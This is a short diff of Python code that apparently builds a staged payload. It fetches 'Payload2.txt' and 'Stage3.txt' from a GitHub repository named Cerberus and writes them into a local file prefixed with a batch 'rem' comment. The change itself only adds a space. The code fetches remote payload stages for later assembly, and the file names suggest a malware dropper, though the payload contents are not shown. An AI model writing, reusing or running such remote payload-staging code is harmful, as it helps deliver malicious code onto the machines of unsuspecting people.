@@ -10,7 +10,7 @@ if os.path.isfile(path) == False:
 with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Payload2.txt") as retrieve:
     data = retrieve.read().decode("utf-8")
     with open(filename, "a+") as file: 
-        file.write("rem" + rN + "\n" + data)
+        file.write("rem " + rN + "\n" + data)
 
 with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage3.txt") as retrieve:
     data = retrieve.read().decode("utf-8")
